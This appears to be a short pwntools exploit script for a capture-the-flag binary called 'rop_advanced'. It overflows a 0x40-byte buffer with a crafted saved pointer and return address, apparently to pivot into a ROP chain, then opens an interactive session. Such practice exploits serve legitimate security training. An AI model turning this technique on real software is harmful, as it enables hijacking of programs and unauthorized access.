from pwn import *

p = process("./rop_advanced")
elf = ELF("./rop_advanced")
pause()
if __name__ == "__main__":
	payload = "a" * 0x40 + p64(0x400582 - 0x8) + p64(0x400430)
	p.send(payload)
	p.interactive()
